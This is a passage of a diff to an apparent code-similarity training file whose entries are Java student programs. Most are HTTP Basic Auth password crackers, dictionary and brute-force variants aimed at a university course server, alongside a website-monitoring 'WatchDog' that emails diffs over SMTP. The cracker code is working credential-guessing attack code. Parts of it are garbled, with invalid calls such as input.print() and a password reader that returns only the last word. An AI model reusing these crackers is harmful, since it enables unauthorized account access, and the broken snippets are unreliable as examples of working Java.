+    - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+      \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+      \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new\
+      \ String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd\
+      \ = getPasswd();\n       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url),\
+      \ login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+      The passsword is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+      \  \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+      \ +r);\n     Dictionary a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again\");\n\tDictionary a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n\
+      \  {\n\n int i=0;int j=0;\n attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for\
+      \ URL reply....... \");\n  String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream\
+      \ (\"words\");\n DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n\
+      \ count++;\n \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream\
+      \ openURLForInput (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setDoInput (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private\
+      \ final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M',\
+      \ 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n \
+      \      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y',\
+      \ 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode\
+      \ (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n\
+      \     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n\
+      \       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else\
+      \ {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n\
+      \             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n  \
+      \     byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n  \
+      \     byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n\
+      \       switch (pad) {\n         case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array\
+      \ [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString +=\
+      \ \"=\";\n          break;\n         case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+      \   }\n       return encodedString;\n   }\n }\n\n"
+  - source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+      \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+      \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\"\
+      ,\n     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new\
+      \ BufferedReader(new FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] !=\
+      \ null) {\n\t\n\t\t\t if (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status)\
+      \ {\n\t\t\t \t\t System.out.println(\"Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of\
+      \ attempts = \" + attempt);\n\t\t\t \t\t break exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t\
+      }\n\t } catch (FileNotFoundException e1) {\n\t\t \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException\
+      \ e2) {\n\t\t\n\t\te2.printStackTrace();\n\t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n \
+      \      BufferedReader in = new BufferedReader(\n           new InputStreamReader\n              (connectURL(new URL(args[0]),\
+      \ args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           status = true;\n           }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public\
+      \ InputStream connectURL (URL url, String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+      \     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username, String password)\
+      \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static char base64Array\
+      \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+      \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+      \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n \
+      \      '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private static String base64Encode (String string)    {\n\
+      \     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n \
+      \    while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length)\
+      \ {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n\
+      \          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n \
+      \            b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3)\
+      \ << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n\
+      \       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n     \
+      \   case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n\
+      \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+      \        case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+      \   }\n }\n\n"
+    sentences:
+    - "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class WatchDog extends TimerTask{\n\n  private\
+      \ static URL location;\n  private static String email;\n  private static int checktime;\n  private static Timer timer\
+      \ = new Timer();\n  private BufferedReader input;\n  private File checksumFile = new File(\"chksum.txt\");\n  private\
+      \ File temp0000File = new File(\"temp0000\");\n  private File kept0000File = new File(\"kept0000\");\n\n  \n\n    public\
+      \ WatchDog(){\n      timer.schedule(this, new Date(), checktime);\n    }\n\n\n    \n\n      public void run(){\n   \
+      \     Vector imageFiles = new Vector();\n        Vector diffImages = new Vector();\n        try {\n          System.out.println(\"\
+      \ Time: \".concat(new Date().toString()));\n          System.out.println(\"Retreiving File\");\n          \n       \
+      \   input = new BufferedReader(new InputStreamReader\n                                     (location.openStream()));\n\
+      \          \n          BufferedWriter outputFile = new BufferedWriter\n              (new FileWriter(temp0000File));\n\
+      \          String line = input.readLine();\n          while (line != null) {\n            StringBuffer imageFileName\
+      \ = new StringBuffer();\n            if (scanForImages(line, imageFileName)) {\n              String imageFile = new\
+      \ String(imageFileName);\n              System.out.println(\"Detected image: \".concat(imageFile));\n              try\
+      \ {\n                imageFiles.add(new URL(imageFile));\n              }\n              catch (MalformedURLException\
+      \ e) {\n                System.out.println(\"Image file detected. URL is malformed\");\n              }\n          \
+      \  }\n            outputFile.write(line);\n            outputFile.write(\"\\n\");\n            line = input.readLine();\n\
+      \          }\n          input.print();\n          outputFile.flush();\n          outputFile.print();\n          System.out.println(\"\
+      \ File Retreived\");\n          if (!imageFiles.isEmpty()) {\n            checkImages(imageFiles, diffImages);\n   \
+      \       }\n          if (!checksumFile.exists()) {\n            generateChecksum(temp0000File.getName(), checksumFile);\n\
+      \          }\n          else {\n            if (!checksumOk(checksumFile)) {\n              reportDifferences(true,\
+      \ temp0000File, kept0000File, diffImages);\n              generateChecksum(temp0000File.getName(), checksumFile);\n\
+      \            }\n            else if (!diffImages.isEmpty()){\n              reportDifferences(false, null, null, diffImages);\n\
+      \            }\n          }\n\n          \n          temp0000File.renameTo(kept0000File);\n          System.out.println(\"\
+      End Time: \".concat(new Date().toString()));\n        }\n        catch (MalformedURLException e) {\n          e.printStackTrace();\n\
+      \        }\n        catch (ConnectException e) {\n          System.out.println(\"Failed  connect\");\n          System.exit(-1);\n\
+      \        }\n        catch (IOException e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n\
+      \      }\n\n      \n\n      public boolean scanForImages(String line, StringBuffer imageFileName) {\n        \n    \
+      \    \n        String lineIgnoreCase = line.toLowerCase();\n        int imgPos = lineIgnoreCase.indexOf(\"<img \");\n\
+      \        if ( imgPos != -1 ){\n          int srcPos = lineIgnoreCase.indexOf(\"src\", imgPos);\n          int bracketPos\
+      \ = lineIgnoreCase.indexOf(\">\", imgPos);\n          if (srcPos != -1 && bracketPos != -1 && srcPos < bracketPos) {\n\
+      \            int quote1Pos = lineIgnoreCase.indexOf(\"\\\"\", srcPos);\n            int quote2Pos = lineIgnoreCase.indexOf(\"\
+      \\\"\", quote1Pos+1);\n            if (quote1Pos != -1 && quote2Pos != -1 &&\n                quote1Pos < quote2Pos\
+      \ && quote2Pos < bracketPos) {\n              \n              imageFileName.append(line.substring(quote1Pos + 1,\n \
+      \                 quote2Pos));\n              if (imageFileName.indexOf(\"//\") == -1 ) {\n                \n      \
+      \          String URLName = location.toString();\n                int slashPos = URLName.lastIndexOf(\"/\");\n     \
+      \           URLName = URLName.substring(0, slashPos);\n                String HostName = \"http://\".concat(location.getHost());\n\
+      \                if (imageFileName.indexOf(\"//\") == 0) {\n                  \n                }\n                else\
+      \ if (imageFileName.charAt(0) != '/') {\n                  \n                  imageFileName.insert(0, URLName.concat(\"\
+      /\"));\n                }\n                else {\n                  \n                  imageFileName.insert(0, HostName);\n\
+      \                }\n              }\n              return true;\n            }\n          }\n        }\n        return\
+      \ false;\n      }\n\n      \n\n      public void checkImages(Vector imageFiles, Vector diffImages)\n          throws\
+      \ IOException{\n        System.out.println(\"Retrieving image \");\n        Enumeration imageFilesEnumeration = imageFiles.elements();\n\
+      \        while (imageFilesEnumeration.hasMoreElements()) {\n          URL url = (URL)imageFilesEnumeration.nextElement();\n\
+      \          try {\n            BufferedInputStream imageInput = new BufferedInputStream\n                (url.openStream());\n\
+      \            String localFile = url.getFile();\n            \n            \n            \n            \n           \
+      \ \n            int slashPosition = localFile.lastIndexOf(\"/\");\n            if (slashPosition != -1) {\n        \
+      \      localFile = localFile.substring(slashPosition+1);\n            }\n            System.out.println(\"Retrieving\
+      \ image file: \".concat(localFile));\n            BufferedOutputStream imageOutput = new BufferedOutputStream\n    \
+      \            (new FileOutputStream(localFile));\n            byte bytes[] = new byte[10000];\n            int noBytes\
+      \ = imageInput.get(bytes);\n            while (noBytes != -1) {\n              imageOutput.write(bytes, 0, noBytes );\n\
+      \              noBytes = imageInput.print(bytes);\n            }\n            File imageChecksumFile = new File(localFile.concat(\"\
+      .chksum.txt\"));\n            if (!imageChecksumFile.exists()) {\n              generateChecksum(localFile, imageChecksumFile);\n\
+      \            }\n            else {\n              if (!checksumOk(imageChecksumFile)) {\n                diffImages.add(localFile);\n\
+      \                generateChecksum(localFile, imageChecksumFile);\n              }\n            }\n          }\n    \
+      \      catch (FileNotFoundException e) {\n            System.out.println(\"Unable  locate URL: \".concat(url.toString()));\n\
+      \          }\n        }\n      }\n\n      \n\n      public void generateChecksum(String inputFile, File checksum){\n\
+      \        try {\n          System.out.println(\"Generating new checksum for \".concat(inputFile));\n          \n    \
+      \      Process process = Runtime.getRuntime().exec(\"md5sum \".\n                                                  \
+      \    concat(inputFile));\n          BufferedReader execCommand = new BufferedReader(new\n              InputStreamReader((process.getInputStream())));\n\
+      \          BufferedWriter outputFile = new\n              BufferedWriter(new FileWriter(checksum));\n          String\
+      \ line = execCommand.readLine();\n          while (line != null) {\n            outputFile.write(line);\n          \
+      \  outputFile.write(\"\\n\");\n            line = execCommand.readLine();\n          }\n          outputFile.flush();\n\
+      \          outputFile.print();\n          System.out.println(\"Checksum produced\");\n        }\n        catch (IOException\
+      \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean\
+      \ checksumOk(File chksumFile){\n        try {\n          System.out.println(\"Comparing checksums using \".concat(chksumFile\n\
+      \              ,e.getName()));\n          \n          Process process = Runtime.getRuntime().\n              exec(\"\
+      md5sum --check \".concat(chksumFile.getName()));\n          BufferedReader execCommand = new BufferedReader(new\n  \
+      \            InputStreamReader( (process.getInputStream())));\n          String line = execCommand.readLine();\n   \
+      \       if (line.indexOf(\": OK\") != -1) {\n            System.out.println(\"  the same\");\n            return true;\n\
+      \          }\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n          System.exit(-1);\n\
+      \        }\n        System.out.println(\"Differences Found\");\n        return false;\n      }\n\n      \n\n      public\
+      \ void reportDifferences(boolean diffsFound, File file1, File file2,\n                                    Vector images){\n\
+      \        try {\n          System.out.println(\"Generating difference report\");\n          \n          Socket emailConnection\
+      \ = new Socket(\"yallara.cs.rmit.edu.\", 25);\n          BufferedWriter emailOutStream = new BufferedWriter\n      \
+      \        (new OutputStreamWriter(emailConnection.getOutputStream()));\n          BufferedReader emailInStream = new\
+      \ BufferedReader\n              (new InputStreamReader(emailConnection.getInputStream()));\n          String line =\
+      \ emailInStream.readLine();\n          System.out.println(line);\n          if (!line.startsWith(\"220\")) {\n     \
+      \         System.out.println\n                  (\" error occured connecting  email server. Cannot send email.\");\n\
+      \          }\n          else {\n            \n            \n            emailOutStream.write(\"HELO yallara.cs.rmit.edu.\"\
+      );\n            emailOutStream.newLine();\n            emailOutStream.flush();\n            line = emailInStream.readLine();\n\
+      \            System.out.println(line);\n            if (!line.startsWith(\"250\")) {\n                System.out.println\n\
+      \                    (\" error occured connecting  email server. Cannot send email.\");\n            }\n           \
+      \ else {\n              emailOutStream.write(\"MAIL FROM: watchdog@cs.rmit.edu.\");\n              emailOutStream.newLine();\n\
+      \              emailOutStream.flush();\n              line = emailInStream.readLine();\n              System.out.println(line);\n\
+      \              if (!line.startsWith(\"250\")) {\n                System.out.println\n                    (\" error occured\
+      \ sending email. Cannot send email.\");\n              }\n              else {\n                emailOutStream.write(\"\
+      RCPT : \".concat(email));\n                emailOutStream.newLine();\n                emailOutStream.flush();\n    \
+      \            line = emailInStream.readLine();\n                System.out.println(line);\n                if (!line.startsWith(\"\
+      250\")) {\n                 System.out.println\n                     (\" error occured sending email. Cannot send email.\"\
+      );\n                }\n                else {\n                  emailOutStream.write(\"DATA\");\n                 \
+      \ emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line = emailInStream.readLine();\n\
+      \                  System.out.println(line);\n                  if (!line.startsWith(\"354\")) {\n                 \
+      \  System.out.println\n                       (\" error occured sending email. Cannot send email.\");\n            \
+      \      }\n                  emailOutStream.newLine();\n\n                  if (!images.isEmpty()) {\n              \
+      \        emailOutStream.write\n                          (\"Differences were found in the following image \");\n   \
+      \                   emailOutStream.newLine();\n                      Enumeration e = images.elements();\n          \
+      \            while (e.hasMoreElements()) {\n                        String s = (String) e.nextElement();\n         \
+      \               emailOutStream.write(s);\n                        emailOutStream.newLine();\n                      }\n\
+      \                      emailOutStream.newLine();\n                  }\n\n                  if (diffsFound) {\n     \
+      \               \n                    String command = \"diff \".concat(file1.getName().concat(\" \")\n            \
+      \                                        .concat(file2.getName()));\n                    Process process = Runtime.getRuntime().exec(command);\n\
+      \                    BufferedReader execCommand = new BufferedReader\n                        (new InputStreamReader(\
+      \ (process.getInputStream())));\n                    line = execCommand.readLine();\n                    emailOutStream.write(\"\
+      Diffences found in  file\");\n                    emailOutStream.newLine();\n                    while (line != null)\
+      \ {\n                      System.out.println(line);\n                      emailOutStream.write(line);\n          \
+      \            emailOutStream.newLine();\n                      line = execCommand.readLine();\n                    }\n\
+      \                  }\n\n                  \n                  emailOutStream.newLine();\n                  emailOutStream.write(\"\
+      .\");\n                  emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line\
+      \ = emailInStream.readLine();\n                  System.out.println(line);\n                  if (!line.startsWith(\"\
+      250\")) {\n                    System.out.println\n                        (\" error occured sending email. Cannot send\
+      \ email.\");\n                  }\n                  else {\n                    emailOutStream.write(\"QUIT\");\n \
+      \                   emailOutStream.newLine();\n                    emailOutStream.flush();\n                    System.out.println(emailInStream.readLine());\n\
+      \                  }\n                }\n              }\n            }\n          }\n        }\n        catch (IOException\
+      \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n\n    \n\n    public static\
+      \ void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"Usage: java WatchDog url email\
+      \ checktime(hours)\");\n        System.exit(-1);\n      }\n      try {\n        location = new URL(args[0]);\n     \
+      \ }\n      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      email = new String().concat(args[1]);\n\
+      \      checktime = Integer.parseInt(args[2]) * 60 * 60 * 1000;\n      new WatchDog();\n    }\n}\n"
+    - "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class BruteForce {\n\n   URLConnection conn = null;\n\
+      \   private static boolean status = false;\n\n   public static void main (String args[]){\n     BruteForce a = new BruteForce();\n\
+      \     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n     \t\t\t\t \"\"};\n\
+      \     int attempts = 0;\n     exit:\n     for (int i=0;i<pwdArray.length;i++) {\n\t\t for (int j=0;j<pwdArray.length;j++)\
+      \ {\n\t\t\t for (int k=0;k<pwdArray.length;k++) {\n\t\t\t\t if (pwdArray[i] == ' ' && pwdArray[j] != ' ') continue;\n\
+      \t\t\t\t if (pwdArray[j] == ' ' && pwdArray[k] != ' ') continue;\n\t\t\t\t inp[2] = inp[2] + pwdArray[i] + pwdArray[j]\
+      \ + pwdArray[k];\n\t\t\t\t attempts++;\n     \t\t\t a.doit(inp);\n  \n  \t\t\t\t if (status) {\n\t\t\t\t\t System.out.println(\"\
+      Crrect password is: \" + inp[2]);\n\t\t\t\t\t System.out.println(\"Number of attempts = \" + attempts);\n\t\t\t\t\t\
+      \ break exit;\n\t\t\t \t }\n     \t\t\t inp[2] = \"\";\n\t\t \t }\n\t \t }\n      }\n     }\n\n   public void doit(String\
+      \ args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n           new InputStreamReader\n \
+      \             (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n       while ((line = in.readLine())\
+      \ != null) {\n           System.out.println(line);\n           status = true;\n           }\n       }\n     catch (IOException\
+      \ e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url, String uname, String pword)\n        throws\
+      \ IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private\
+      \ final static char pwdArray [] = {\n\t        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',\n\t        'i', 'j', 'k', 'l',\
+      \ 'm', 'n', 'o', 'p',\n\t        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\n\t        'y', 'z', 'A', 'B', 'C', 'D', 'E',\
+      \ 'F',\n\t        'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',\n\t        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',\n\t   \
+      \     'W', 'X', 'Y', 'Z', ' '\n  };\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E',\
+      \ 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n \
+      \      'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+      \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+      \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+      \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+      \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3\
+      \ = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length)\
+      \ {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n \
+      \         }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte\
+      \ c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array\
+      \ [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString\
+      \ += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n         \
+      \ encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case 2:\n       \
+      \   encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n\n"
+    - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+      \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+      \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new\
+      \ String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd\
+      \ = getPasswd();\n       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url),\
+      \ login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+      The passsword is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+      \  \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+      \ +r);\n     Dictionary a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again\");\n\tDictionary a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n\
+      \  {\n\n int i=0;int j=0;\n attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for\
+      \ URL reply....... \");\n  String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream\
+      \ (\"words\");\n DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n\
+      \ count++;\n \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream\
+      \ openURLForInput (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setDoInput (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private\
+      \ final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M',\
+      \ 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n \
+      \      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y',\
+      \ 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode\
+      \ (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n\
+      \     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n\
+      \       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else\
+      \ {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n\
+      \             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n  \
+      \     byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n  \
+      \     byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n\
+      \       switch (pad) {\n         case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array\
+      \ [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString +=\
+      \ \"=\";\n          break;\n         case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+      \   }\n       return encodedString;\n   }\n }\n\n"
+  - source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+      \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+      \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\"\
+      ,\n     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new\
+      \ BufferedReader(new FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] !=\
+      \ null) {\n\t\n\t\t\t if (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status)\
+      \ {\n\t\t\t \t\t System.out.println(\"Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of\
+      \ attempts = \" + attempt);\n\t\t\t \t\t break exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t\
+      }\n\t } catch (FileNotFoundException e1) {\n\t\t \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException\
+      \ e2) {\n\t\t\n\t\te2.printStackTrace();\n\t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n \
+      \      BufferedReader in = new BufferedReader(\n           new InputStreamReader\n              (connectURL(new URL(args[0]),\
+      \ args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           status = true;\n           }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public\
+      \ InputStream connectURL (URL url, String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+      \     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username, String password)\
+      \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static char base64Array\
+      \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+      \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+      \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n \
+      \      '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private static String base64Encode (String string)    {\n\
+      \     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n \
